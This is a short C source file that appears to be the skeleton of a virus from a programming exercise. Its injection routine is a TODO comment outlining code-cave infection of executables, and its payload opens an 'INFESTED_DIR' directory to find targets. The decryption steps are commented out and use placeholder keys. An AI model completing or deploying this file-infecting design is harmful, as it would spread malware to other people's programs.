#include "ft_virus.h"

void FORCE_INLINE inject(int file_fd)
{
	// TODO
	/*
	find_cave();
	change_sections_header(); // to make the cave executable
	fill_payload(); // mprotect us!
	copy_payload(); // memcpy you know...
	*/
}

void payload()
{
	t_data data;
	int fd;

	data.key = 0xdeadbeaf;
	data.decrypt_start = 0xdeadbeaf;
	//mprotect_us();
	//decrypt();
	fd = OPEN(INFESTED_DIR, O_RDONLY | O_DIRECTORY);
	if (fd == -1)
		return ;
	finder(fd);
	CLOSE(fd);
	//go_to_start();
}

void payload_end(void)
{
	;
}

int main(void)
{
	payload();
	return (0);
}
